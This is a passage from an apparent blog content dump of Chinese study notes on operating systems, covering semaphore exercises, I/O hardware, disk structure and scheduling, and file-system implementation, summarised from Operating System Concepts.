&amp;&amp; num_waiting_south &gt; 0)) // 或者上一次是北方居民过桥，且当前还有南方村庄居民在等待 ok_to_cross.wait(); num_waiting_north --; // 已上桥，北方村庄等待人数减少 prev = 0; &#125; void enter_bridge_south() &#123; num_waiting_south ++; while (on_bridge || prev == 1 &amp;&amp; num_waiting_north &gt; 0)) ok_to_cross.wait(); num_waiting_south --; prev = 1; &#125; void exit_bridge() &#123; // 南北居民离开后都调用此函数 on_bridge = FALSE; ok_to_cross.signal(); &#125;&#125; 简单信号量编程 此部分习题选自 2000 年左右各高校的研究生入学考试题，题目均比较简单。 双车间零件装配 某工厂有两个生产车间和一个装配车间，两个生产车间分别生产 A，B 两种零件，装配车间的任务是把 A，B 两种零件组装成产品。每个车间生产完一个零件后都要把零件送到装配车间的货架 F1、F2 上，F1 存放零件 A，F2 存放零件 B，两个货架均可分别容纳 10 个零件。装配工人每次从货架上取出一个 A 零件和一个 B 零件然后组装成产品。请用信号量进行正确管理。 此问题是生产者-消费者问题的变形，可以认为一个消费者（装配工人）和两个生产者（A，B车间）互斥使用两个缓冲区（F1、F2）。令 mutex1 和 mutex2 这两个互斥信号量控制对缓冲区的互斥操作，另外还需要 empty1、empty2、full1、full2 用来同步。 代码如下 1234567891011121314151617181920212223// 车间 Ado &#123; wait(empty1); wait(mutex1); // 生产零件 A 并放入 F1 signal(mutex1); signal(full);&#125; while (TRUE);// 车间 B 和车间 A 对称// 装配工人do &#123; wait(full1); wait(full2); wait(mutex1); wait(mutex2); // 取出零件 A 和 B signal(mutex1); signal(mutex2); signal(empty1); signal(empty2);&#125; while (TRUE); 和尚挑水问题 （北京邮电大学 1998 年）某寺庙有老、小和尚若干，仅有一个水缸和一个水井。小和尚负责将水从井中挑到缸中以供老和尚饮用。水缸可以容纳最多 10 桶水，水井口非常窄，每次只能容纳一个水桶取水。水桶总数有 3 各，每次小和尚挑水、倒入缸内只能使用一个桶，且不可以同时进行。请使用信号量给出从缸中取水和向缸中倒水的算法描述。 分析：需要将问题分解为数个过程。从井中取水到向缸中倒水应该是一个连续的动作，算作一个进程；老和尚用桶从缸中取水算作一个进程。题中互斥资源包括水井和水缸，分别需要一个信号量来保证互斥。题中同步问题涉及水桶，抢不到水桶的进程需要等待，水缸满时小和尚需要等待，水缸空时老和尚需要等待，这需要生产者-消费者问题的经典信号量控制满和空。 定义信号量如下： mutex1 = mutex2 = 1 ：水井和水缸两个资源各自的互斥访问 empty = 10 ：初始水缸为空，可容纳至多 10 桶水 full = 0 ：初始水缸为空 count = 3 ：水桶数量为 3 代码如下 123456789101112131415161718192021222324// 小和尚do &#123; wait(empty); wait(count); // 争夺水桶 wait(mutex1); // 从井中打水 signal(mutex1); wait(mutex2); // 倒水入水缸 signal(mutex2); signal(count); // 归还水桶 signal(full); // 通知老和尚水缸有水&#125; while (TRUE);// 老和尚do &#123; wait(full); wait(count); wait(mutex2); // 从水缸中打水 signal(mutex2); signal(count); signal(empty);&#125; while (TRUE); 阅览室登记问题 （北方交通大学 1999 年）阅览室有 100 个座位，读者进入阅览室需要先在一张登记表上登记，每个座位有一个条目，读者离开阅览室需要注销自己的登记信息。请使用信号量描述同步算法。约定： 语句 I = getflag(0) 可以搜索到一个空座位 i，通过语句 i.flag = 0 或 1 可以标识座位 i 为空闲（0）或者占用（1）； 语句 i = getname(readername) 可以搜索到读者登记的座位号 i，通过 i.name = 0 可以将座位原本的读者姓名清除，通过 i.name = readername 可以将读者名称关联到座位 i 上； 计数信号量用 count，互斥信号量用 mutex。 分析：约定部分仅仅为代码编写提供一定现成的符号，问题中仅有读者一个对象，因此只需要考虑读者之间是等价的，只需要考虑一个读者的行为。读者进入阅览室应当先检查是否有空闲座位，若存在则登记否则离开。座位显然需要信号量 count 控制。读者离去时需要注销登记信息并释放座位，无论何时对登记簿的修改都需要互斥，如题中约定使用 mutex 。 代码如下，对原题做一定修改，使读者进入阅览室时如果人满则离开，因此需要一个 int 型变量 seats 记录空闲座位数量，而原本的 count 同步信号量可以丢弃。 123456789101112131415161718192021int seats = 100;// 读者进程do &#123; // 进入阅览室 wait(mutex); if (seats &lt;= 0) &#123; signal(mutex); continue; // 无空闲座位，离开阅览室 &#125; seats --; i = getflag(0); i.flag = 1; i.name = readername; // 获取空闲座位、登记 signal(mutex); // 看书 wait(mutex); seats ++; i = getname(readername); i.flag = i.name = 0; // 注销登录信息 signal(mutex);&#125; while (TRUE); 4 乘 100 米接力 用信号量描述 4 × 100 米接力问题。 分析：四个选手之间需要保持链式同步关系，因此设置三个信号量分别表示第 i 棒选手和第 i-1 棒选手之间的同步（0 &lt; i &lt; 5）。 代码如下 1234567891011semaphore s1 = 0, s2 = 0, s3 = 0;// 第一棒起跑并前进 100 米signal(s1);// 第二棒wait(s1);// 第二棒起跑并前进 100 米// ...// ...// 第四棒wait(s3);// 第四棒起跑并前进 100 米到达终点 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（十三）：I/O 输入系统此专栏的下一篇文章：操作系统（专题）：信号量编程（下） 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/06/os-concepts-14/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（十三）：I/O 输入系统","slug":"os-concepts-13","date":"2017-01-06T04:17:33.000Z","updated":"2017-01-11T14:27:00.000Z","comments":true,"path":"2017/01/06/os-concepts-13/","link":"","permalink":"http://forec.github.io/2017/01/06/os-concepts-13/","excerpt":"整理《Operating System Concepts》 第七版第十三章 I/O 输入系统部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第十三章 I/O 输入系统部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 注：整理只包含第 13 章内核 I/O 子系统之前的内容，考试涉及整章内容。 I/O 硬件 设备驱动程序（device drivers） 为 I/O 子系统提供了统一设备的访问接口。 设备和计算机的通信通过 端口（port） ，一组被一个/多个设备共同使用的线称为 总线（bus） 。总线是一组线和一组严格定义的描述在线上传输信息的协议。 链环（daisy chaine） 形容的是多个设备相连，最终设备通过端口连接到计算机上的模式。链环常常按总线方式工作，一个典型的 PC 总线结构如下图。 上图中包含一个 PCI 总线 （最常用的 PC 系统总线）用于连接 CPU 和内存子系统/快速设备， 扩展总线（expansion bus） 用于连接串/并行端口和相对慢的设备（键盘）。 控制器（controller） 是用来操作端口、总线或者设备的一组电子器件，它的复杂程度和传输协议有关，如串行端口控制器比较简单，而 SCSI 总线控制器常实现为一个和计算机相连的独立的 主机适配器（host adapter） ，这个适配器会有处理器、微码以及一定的私有内存，从而能够处理 SCSI 协议信息。 控制器有一个/多个用于数据和控制信号的寄存器， 处理器通过读写这些寄存器来实现与控制器的通信 。这种通信的可以通过特殊的 I/O 指令向指定的 I/O 端口地址传输一个字节/字，也可以通过 内存映射 I/O 模式（在 虚拟内存 中介绍过），处理器能够通过标准数据传输指令完成对控制器的读写。部分系统同时采用这两种方式，例如图像控制器有 I/O 端口来完成基本控制操作，还有一个较大的内存映射区域来支持屏幕内容的接收和生成。 I/O 端口通常有 4 种寄存器，寄存器通常为 1 ~ 4B：状态寄存器、控制寄存器、数据输入寄存器和数据输出寄存器。有的控制器有 FIFO 芯片从而可以保留多个输入/输出数据。上述四种寄存器的主要功能有： 主机从 数据输入寄存器 读出数据 主机向 数据输出寄存器 写入数据 主机可从 状态寄存器 读出设备当前的状态 主机向 控制寄存器 写入数据来发送命令、改变设备状态 轮询 主机和控制器之间交互很复杂，但基本的 握手（handshaking） 比较简单。假设控制器的状态寄存器中有一位用于说明设备当前是否在忙，控制器正忙时就将这一位置位。控制器的命令寄存器中有一位说明主机是否有任务准备就绪，当主机需要控制器执行某个操作时，需要将命令寄存器的这一位置位。主机和控制器交互输出一个字节时的握手流程如下： 主机不断读取状态寄存器，直到状态寄存器中的 忙位 为 0 主机设置命令寄存器中的 写位 并把一个字节写到数据输出寄存器 主机设置命令寄存器中的 就绪位 控制器注意到命令寄存器中的就绪位被置位，因此将状态寄存器中的 忙位 置位 控制器读取命令寄存器并发现 写位 被置位，因此了解到需要执行一条写命令。它从数据输出寄存器读出一个字节，并向设备执行 I/O 操作 控制器操作完成后将命令寄存器中的 就绪位 清除，并清除状态寄存器中的 故障位 （这说明 I/O 设备成功完成任务），最后清除状态寄存器中的 忙位 表示本次字节传输操作结束 在步骤 1 中主机将处于 忙等待（busy-waiting） 或者 轮询（polling） 状态。多数计算机体系只需要三个 CPU 指令周期就可以完成基本的轮询操作，但不断地重复轮询会浪费处理器资源。 中断 中断（interrupt） 是使外设通知 CPU 的硬件机制。CPU 硬件有一条 中断请求线（Interrupt-request line，IRL） ，CPU 执行完每条指令都会检测 IRL 判断是否有控制器通过 IRL 发送了信号。如果有，CPU 会保存当前的状态并且跳转到 中断处理程序（interrupt-handler） 。中断处理程序会判断中断原因、进行处理、恢复状态并执行中断返回指令使 CPU 返回中断之前的执行状态。整个流程大致为： 设备控制器通过中断请求线 发送中断信号引起（raise）中断 CPU 捕获（catch）中断并分发（dispatch）到中断处理程序 中断处理程序处理设备请求以 清除中断 CPU 和 中断控制器（interrupt-controller） 硬件提供了以下三个特性： 在 CPU 执行关键指令时可以延迟对中断的处理 能够将中断快速转发给适当的中断处理程序，而不必检查所有设备以确定是哪个设备引发了中断 支持多级中断，可以根据紧迫性来响应中断 多数 CPU 有两个中断请求线： 非屏蔽中断（nonmaskable） 用于处理非常严重的，不可以恢复的内存错误等问题， 可屏蔽中断（maskable） 可被设备控制器用来请求服务，如果 CPU 正在执行关键、不可中断指令，则可以屏蔽这一类中断线上的请求。 中断机制根据 中断向量（interrupt vector） 来选择中断服务程序。中断向量和中断服务程序被维护在一张表中，中断向量支持的地址数量有限（例如 8 位中断向量只能对应 256 个中断服务程序，奔腾即为 256 个中断向量，0~31 用于各种错误等非屏蔽中断，剩下的为可屏蔽中断）， 中断链接（interrupt chaining） 可解决这个问题：中断向量指向的不再是单一的中断服务程序，而是一个中断服务程序的链表，中断一旦发生，对应链表中的全部中断处理程序都会一一调用，直到发现了能够处理请求的中断服务程序为止。 中断优先级（interrupt priority） 使 CPU 可以在不屏蔽所有中断的情况下延迟处理低优先级的中断，并且也允许高优先级的中断抢占低优先级的中断处理。 现代操作系统启动时会探查硬件总线、确定哪些设备存在并将对应的中断处理程序安装到中断向量中。操作系统对于中断机制的应用非常广泛： 设备控制器通过中断表明自己已经准备好服务 通过中断机制处理例如被 0 除、违例内存访问等 异常（Exception） 使用中断进行虚拟内存分页，页错误会引发中断异常，这个中断会挂起当前进程并跳转到内核的页错误处理程序 程序执行系统调用会触发 软中断（software interrupt） 或者 陷阱指令（trap） 直接内存访问 使用通用处理器不断监听设备控制器的寄存器并按字节传输（ 程序控制 I/O ，Programmed I/O，PIO）是对计算资源的非常过分的浪费。计算机为了避免 PIO 增加 CPU 负担，将一部分数据传输任务交付 直接内存访问（direct-memory access，DMA） 控制器。 开始 DMA 传输时，主机向内存写入 DMA 命令块，块中包含传输的源、目的地址指针以及传输的字节数。 CPU 将该命令块的地址写到 DMA 控制器中 并继续其他工作，DMA 控制器会根据命令块直接操作内存总线完成传输（这段时间 CPU 无法使用总线）。传输完成后 DMA 控制器会中断 CPU 并交还给 CPU 总线控制权。 DMA 和设备控制器之间的握手通过 DMA-request 和 DMA-acknowledge 线进行，设备有数据需要传输时，设备控制器就通过 DMA-request 线通知 DMA 控制器，DMA 控制器会发出申请中断 CPU，在从 CPU 获取所需要的地址后将地址放到内存地址总线上，并通过 DMA-acknowledge 线通知设备控制器。设备控制器收到这个信号，向内存地址总线上的地址写入数据。交互过程如下图。 DMA 控制总线传输期间 CPU 不能访问主存（仍可访问 L1、L2 缓存），这称为 周期挪用（cycle stealing） ，会放慢 CPU 计算，但往往能够改善系统总体性能。有的 DMA 使用物理内存地址，有的使用虚拟内存地址（这时候需要有一个虚拟到物理地址的转换），使用虚拟内存地址的 DMA 称为 直接虚拟内存访问（direct virtual-memory access，DVMA） 。DVMA 可以直接实现两个内存映射设备之间的传输而无需 CPU 干涉。 I/O 应用接口及后面几节简单摘要 设备在很多方面有很大差异： 字符流或块：字符流设备按字节传输，块设备以块为单位传输 顺序访问或随机访问 同步或异步：同步设备按照一定响应时间进行数据传输，异步设备则呈现无规则/不可预测的响应时间 共享或专用：共享设备可以被多个进程/线程并发使用，专用设备则不可以 操作速度：设备速度不同 读写/只读/只写：设备支持的数据传输方向不同 块设备（block-device） 接口规定了访问磁盘驱动器以及其它块设备所需的各个方面。操作系统本身和特殊的应用程序（如数据库）倾向于将块设备当作简单的线性块数组访问，这种访问方式称为 原始（raw） I/O 。 阻塞和非阻塞 I/O ： 应用程序发出 阻塞（blocking） I/O 类型的系统调用时，应用程序就会被挂起，移动到进程等待队列中。因为阻塞式的 I/O 容易理解，并且 I/O 设备执行所需的时间是异步的，执行时间不可预估，因此绝大多数操作系统给应用程序预留的接口都是阻塞系统调用。 有的用户级进程需要 非阻塞（nonblocking） I/O ，例如用户接口，它用来接收键盘/鼠标输入，同时还要在屏幕回显。又或者视频应用程序，它需要从磁盘读取帧并解码到显示器上。非阻塞 I/O 通常使用多线程实现，有的线程执行阻塞系统调用，其他线程继续执行。 异步系统调用（asynchronous system call） 不必等待 I/O 完成就可以立刻返回，应用程序继续执行。I/O 完成时会通知应用程序，比如设置程序空间里某个变量，或者触发信号/软件中断等。 缓冲区（buffer） 是用来保存两个设备之间或者设备和应用程序之间传输数据的内存区域。采用缓冲的理由有： 处理数据流的生产者与消费者之间的速度差异 协调传输数据大小不一致的设备 支持程序 I/O 的复制语义 I/O 内核子系统 （kernel’s I/O subsystem）提供了很多和 I/O 有关的服务，包括： 调度（scheduling） 缓冲（buffering） 高速缓存（caching） 假脱机（spooling） 设备预留（device reservation） 错误处理（error handling） 名称转换（name translation） 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（十二）：大容量存储器结构此专栏的下一篇文章：操作系统（专题）：信号量编程 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/06/os-concepts-13/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（十二）：大容量存储器结构","slug":"os-concepts-12","date":"2017-01-05T15:23:30.000Z","updated":"2017-01-09T15:06:18.000Z","comments":true,"path":"2017/01/05/os-concepts-12/","link":"","permalink":"http://forec.github.io/2017/01/05/os-concepts-12/","excerpt":"整理《Operating System Concepts》 第七版第十二章大容量存储器结构部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第十二章大容量存储器结构部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 大容量存储器结构概览 磁盘（magnetic disk） 是现代计算机系统使用的大容量外存。磁盘片为扁平原盘，两面均涂有磁质材料，读写头在磁盘片的表面飞行，磁头和 磁臂（disk arm） 相连 ，磁臂将每个盘面两侧的全部磁头作为一个整体一起移动。磁盘片表面被逻辑划分为圆形 磁道（track） ，一圈磁道被进一步划分为 扇区（sector） 。同一圈磁道在不同盘片的集合组成了 柱面（cylinder） 。磁盘结构如下图。 多数驱动器每秒可旋转 60~200 圈，磁盘速度由 传输速率（transfer rate） 和 定位时间（positioning time） 决定。其中传输速率指驱动器和计算机之间的数据传输速率；定位时间又称 随机访问时间（random access time） ，包括 寻道时间（seek time） （移动磁臂到所需柱面所需的时间） 和 旋转等待时间（rotational latency） （等待磁盘驱动器将所需扇区旋转到磁头下的时间）。寻道时间和旋转等待时间通常为几毫秒，典型的磁盘能够以几兆每秒的速率传输。 磁盘的传输速率总是低于有效的传输速率。 磁盘表现的传输速率是磁盘头从磁性介质读取比特的速率 ，这不同于给操作系统传输块的速率（与操作系统之间传输的速率才是决定磁盘速度的传输速率）。 磁头飞行在盘片数微米上的空气层中，一旦磁头和盘片接触就会损坏磁盘表面，这称为 磁头碰撞（head crash） 。磁头碰撞不能修复，整个磁盘必须替换。 磁盘可移动或更换。 软盘（floppy disk） 是便宜的可移动磁盘，存储容量在 1.44MB 左右。 磁盘驱动器通过 I/O总线 和计算机相连，可用的总线包括 EIDE（enhanced integrated drive electronics） 、 ATA（advanced technology attachment） 和 串行 ATA（serial ATA，SATA） 、 USB（universal serial bus） 、 FC（fiber channel） 和 SCSI 总线。 控制器（controller） 是一个特殊处理器，用于执行总线上的数据传输。其中， 主机（host） 控制器是计算机上位于总线末端的控制器，而 磁盘（disk） 控制器位于磁盘驱动器内。 磁带（magnetic tape） 是早期次级存储介质，但访问速度过慢。典型磁带可以存储 20~200GB。 火线（FireWire） 指一个接口，这个接口可以将外部设备如磁盘驱动器、DVD 驱动器等连接到计算机系统。 磁盘结构和附属 现代磁盘驱动器可以看作一个一维的 逻辑块（logical blocks） 数组，逻辑块是最小的传输单位，通常为 512B，部分磁盘可以通过 低级格式化（low-level formatted） 来选择不同的逻辑块大小。 一维逻辑块数组按顺序映射到磁盘的扇区， 扇区 0 是最外面柱面的第一个磁道的第一个扇区 ，这个映射关系先按磁道内的扇区顺序，之后按这一柱面上各个盘面的磁道顺序，最后按照 从外向内 的柱面顺序排序。通过这种映射， 可以将逻辑块号转换为磁盘内的柱面号、柱面内的磁道号以及磁道内的扇区号 。这种转换有一些问题，原因在于： 多数磁盘有一些缺陷扇区，这时候映射需要用其它空闲扇区替代这些缺陷扇区 有些磁盘每个磁道上的扇区数不是常量 对于使用 常量线性速度（constant linear velocity，CLV） 的介质，每个磁道的位密度均匀，离盘片中心更远的磁道的长度更长，容纳的扇区也就更多，这样从内向外的磁道所包含的扇区数就会逐渐增多，外部磁道的扇区数通常比内部磁道的扇区数多 40%。这时，盘片驱动器在磁头的不同位置的旋转速度将不同，磁头越靠近盘片中心则旋转速度越快。 硬盘中通常采用 恒定圆角速度（constant angular velocity，CAV） ，这时内磁道到外磁道的位密度会不断降低，以使磁盘驱动器转速恒定的情况下也能维持恒定的数据率。 计算机访问磁盘可通过 I/O 端口，或称 主机附属存储（host-attached storage） ，这一般在小系统中采用；或者通过分布式文件系统的远程主机，这称为 网络附属存储（network-attached storage） 。 磁盘调度 强调磁盘的几个参数： 寻道时间 是磁臂旋转以使磁头位于目标扇区所属的柱面上的时间 旋转延迟 是磁盘驱动器将盘片旋转以使目标扇区转动到磁头下的时间 磁盘带宽 是传输的总字节数除以从 服务 请求开始到传递结束的总时间。可以通过磁盘 I/O 请求调度来排列访问顺序，从而提高访问速度和带宽。 进程需要磁盘 I/O 操作时会向操作系统发出系统调用，这个调用请求包括： 操作类型：输入/输出 本次传输的磁盘地址、内存地址、扇区数 多个进程的多道程序系统，磁盘队列可能有多个待处理请求，此时操作系统需对磁盘请求进行调度，包括 FCFS、SSTF、SCAN、C-SCAN、LOOK、C-LOOK。 FCFS 调度 先来先服务算法，此算法比较公平但无法提供最快的服务。 SSTF 调度 最短寻道时间优先法（shortest-seek-time-first，SSTF） 会先处理最靠近当前磁头位置的请求，即选择距离当前磁头位置所需寻道时间最短的请求来处理。 本质上是最短作业优先（SJF）调度，但与 SJF 类似，它可能导致一些请求得不到服务，如果待处理请求队列比较长，很有可能某个请求会产生饥饿。SSTF 调度相比 FCFS 调度有很大改善，但仍不是最优的。 SCAN 和 C-SCAN 调度 SCAN 算法有时称为 电梯算法（elevator algorithm） ，磁臂会从磁盘的一端向另一端移动（按一维逻辑块数组的顺序），当磁头移动过每个柱面时就会处理这个柱面的服务请求。到达另一端后磁头会反向继续移动，如此往返。 如果一个请求刚好在磁头移动到请求位置之前加入磁盘请求队列，则它会马上得到服务 如果一个请求刚好在磁头移动过请求位置后加入队列，则它需要等待磁头到达另一端并调转方向、返回后才能得到服务 C-SCAN（circular SCAN） 调度和 SCAN 类似，但当磁头从磁盘的 0 号扇区移动到磁盘的最后一个扇区（或者柱面）后不会调转方向，而是从 0 号重新开始扫描整个磁盘。 这两种算法都不会导致饥饿现象。 LOOK 和 C-LOOK 调度 LOOK 和 SCAN 算法类似，磁头向一个方向移动，但不会一直移动到最后一个柱面才折返，而是处理完这个方向上最后一个请求后就掉头。 C-LOOK 和 C-SCAN 类似，处理完最后一个请求后就会将磁头恢复到磁盘一端重新开始按固定顺序扫描。 算法选择 磁盘服务请求很大程度上受文件分配方法影响：一个连续分配文件会产生几个磁盘上相近位置的请求，而链接/索引文件会产生很多分散在磁盘上的块。 目录和索引块在磁盘上的位置也很重要，如果目录位于第一个柱面而文件数据位于最后一个柱面，则磁头需要横跨整个磁盘宽度。如果目录在中央柱面，则磁头只需要移动不到一半的磁盘宽度。 磁盘调度算法应该作为一个操作系统的独立模块，在必要的时候模块应该可以被替换。SSTF 或 LOOK 算法是比较合理的默认算法。 调度算法只考虑了寻道距离。旋转延迟几乎和寻道时间一样，但操作系统无法通过调度改善旋转延迟，因为现代磁盘并不透露逻辑块的物理位置。磁盘制造商会在磁盘控制器中加入磁盘调度算法缓解寻道时间和旋转延迟问题。 因为操作系统对请求服务的顺序有更多限制（如按需分页的 I/O 请求比普通应用程序的 I/O 请求优先级高），因此操作系统不能完全将磁盘调度交给磁盘控制器，而是选择自己的磁盘调度算法，将请求按调度好的顺序、按批次交给磁盘控制器。 磁盘管理磁盘格式化 新磁盘仅仅是含有磁性记录材料的盘片，需要通过 低级格式化（物理格式化，physical formatting） 分为扇区。 低级格式化将磁盘的每个扇区按特定的数据结构填充数据，扇区的数据结构包括头、数据区（通常 512B）和尾部。头部和尾部包含磁盘控制器需要的信息，如扇区号码和 纠错代码（error-correcting code，ECC） 。 操作系统需要将自己的数据结构记录到磁盘上，首先需要将磁盘分为一个或多个柱面组成的分区，操作系统可以将每个分区视作独立的磁盘。分区之后，操作系统需要通过 逻辑格式化（logical formatting） 来创建文件系统，操作系统会将初始的文件系统数据结构存储到磁盘上。这些数据结构包括那些仍空闲的和已经分配的空间（如分配给 FAT 或者 inode）和一个初始为空的目录。 为提高效率，多数操作系统将多个块集中到一大块，称为 簇（cluster） 。磁盘 I/O 通过块完成，文件系统 I/O 通过簇完成。 引导块 计算机开始运行时需要初始化（自举，bootstrap）程序，它负责初始化系统所需的各个方面，并找到磁盘上的操作系统内核，将其装入内存开始执行。 自举程序保存在 只读存储器（ROM） 中，其位置固定，并且只读（不受病毒影响），但改变自举代码就需要改变 ROM 硬件芯片。因此操作系统只在启动 ROM 中保留一个非常小的自举程序，这个小自举程序会从磁盘上调入更完整的自举程序。更完整的自举程序可以修改，并且保存在磁盘的启动块上。 磁盘的 启动块（boot blocks） 位于磁盘的固定位置，拥有启动分区的磁盘称为 启动磁盘（boot disk） 或者 系统磁盘（system disk） 。启动 ROM 中的代码将启动块中的代码装入内存并执行，启动块中的完整自举程序会从 非固定位置 装入整个操作系统并执行。 以 Windows 2000 为例，其启动代码放置在硬盘的第一个扇区，被称为 主引导记录（master boot record，MBR） ，MRB 中除了包含自举程序的代码，还包含硬盘分区列表和系统引导分区的具体标识。Win 2000 将硬盘分成多个分区，其中一个为 引导分区（boot partition） ，该分区包括了操作系统和设备驱动程序。MBR 确定引导分区的位置后就会读取引导分区的第一个扇区（引导扇区，boot sector）并继续剩余的启动过程。 坏块 磁盘有移动部件且容错能力小，容易出问题。多数磁盘从工厂出来就有 坏块（bad blocks） 。坏块中的数据会丢失。 简单磁盘可手动处理坏扇区。如 MS-DOS 的 format 命令执行逻辑格式化时，会扫描磁盘查找坏扇区，如果找到就在 FAT 的条目中写上特殊值以标明该块已损毁。 复杂磁盘（高端 PC、WorkStation 或服务器上的 SCSI 磁盘）需要控制器维护一个磁盘坏块链表，这个链表在磁盘出厂前进行低级格式化时就已经初始化，并在磁盘使用过程中不断更新。低级格式化会将一些块备用，操作系统无法看到这些块。当坏块出现时，控制器会用备用块替换这些坏块。这种方案称为 扇区备用（sector sparing） 或 转寄（forwarding） 。 典型的坏块区事务处理： 操作系统访问逻辑块 87 控制器计算该块的 ECC 值，发现该块已经损坏，因此将结果通知操作系统 下次操作系统重启时运行特殊程序告知 SCSI 控制器用备用块替代坏块 之后的每次系统访问逻辑块 87，请求都会被转换成替代后的备用块地址 扇区备用的另一方案是 扇区滑动（sector slipping） ：假定逻辑块 17 损坏，第一个可用的备用块是扇区 203，则将 18 ~ 202 扇区向下滑动一个扇区，变为 19 ~ 203 扇区。这样原本的扇区 18 变为空，用来替换扇区 17。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（十一）：文件系统实现此专栏的下一篇文章：操作系统（十三）：I/O 输入系统 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/05/os-concepts-12/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（十一）：文件系统实现","slug":"os-concepts-11","date":"2017-01-05T09:11:59.000Z","updated":"2017-01-09T14:43:48.000Z","comments":true,"path":"2017/01/05/os-concepts-11/","link":"","permalink":"http://forec.github.io/2017/01/05/os-concepts-11/","excerpt":"整理《Operating System Concepts》 第七版第十一章文件系统实现部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第十一章文件系统实现部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 文件系统结构 磁盘具有如下两个特点因而成为大容量多文件存储的方便介质： 可以原地重写 可以直接访问磁盘上任意一块信息 内存和磁盘之间的 I/O 转移以 块 为单位而非字节。每块为一个或多个扇区，扇区大小从 32 ~ 4096B 不等，通常是 512B。 文件系统包括多层，下图是一个分层的例子，每一层利用较低层的功能创建新功能以为更高层提供服务。 I/O 控制 是最底层，由 设备驱动程序（device drivers） 组成。 基本文件系统（basic file system） 只需要向设备驱动程序发送一般指令就可以对磁盘上的物理块做读写，每个块由它的磁盘地址标识（驱动器 1，柱面 73，磁道 3，扇区 10）。 文件组织模块（file-organization module） 直到文件和它的逻辑块、物理块。因为文件组织模块知道文件类型和位置，因此可以将逻辑块地址转换成基本文件系统用的物理块地址。它也包括 空闲空间管理器 用来追踪未分配的块。 逻辑文件系统（logical file system） 管理元数据，元数据包括文件系统的全部结构数据而不包括文件的具体内容。逻辑文件系统为文件组织模块提供所需的信息，通过 文件控制块（file-control block，FCB） 来维护文件结构，同时也负责保护和安全。 目前多数操作系统都支持多个文件系统，UNIX 使用 UNIX文件系统（UFS），基于伯克利快速文件系统（FFS）。标准的 Linux 文件系统是 可扩展文件系统（extended file system） ，常见版本有 ext2 和 ext3。 实现基本结构 磁盘上的文件系统涉及如下一些结构： （每个卷的）引导控制块（boot control block） ：从这个卷引导操作系统所需要的信息，如果这个卷没有安装操作系统则这一块内容为空。它通常是卷的第一块，UFS 称之为 引导块（boot block） ，NTFS 系统称之为 分区引导扇区（partition boot sector） 。 （每个卷的）卷控制块（volume control block） ：包括卷或分区的详细信息，如分区块数、块大小、空闲块数量和指针、空闲 FCB 的数量和指针等。UFS 称之为 超级块（superblock） ，在 NTFS 中存储在 主控文件表（Master File Table） 。主控文件表采用关系型数据库，每个文件占据一行。 每个文件的 FCB 包含文件的详细信息（文件权限、拥有者、大小、位置）等，UFS 称之为 索引节点（inode） 。 每个文件系统的目录结构，这些目录结构用于组织文件。UFS 中目录结构包括文件名和相关的索引节点号，NTFS 则保存在主控文件表中。 内存内信息用于文件系统管理，可以通过缓存来提高性能。这部分数据在文件系统挂载（安装）的时候被加载，文件系统卸载的时候丢弃，可能包括： 内存中的安装表，含有所有已安装卷的信息 内存中的目录结构缓存，保存最近访问过的目录信息 系统范围内的打开文件表 ，在 文件系统接口 中介绍过，包括每个打开文件的 FCB 副本和其它信息 单个进程的打开文件表 ，每个条目包括指向系统范围内打开文件表的条目的指针以及与进程相关的其它文件信息 打开文件表的索引有多种名称，UFS 称之为 文件描述符（file descriptor） ，Windows 称之为 文件句柄（file handle） ，只要文件没有关闭，所有对文件的操作都是通过打开文件表执行的。文件系统中用户进程读文件的操作形式如下图所示。 分区和挂载 一个磁盘可以分成多个分区，一个卷也可能横跨多个磁盘上的多个分区（RAID 的一种形式）。 没有文件系统的分区称作 生（raw） 磁盘，含有文件系统的分区称为 熟（cooked） 的。生磁盘通常用于没有合适的文件系统可以使用的地方，例如 UNIX 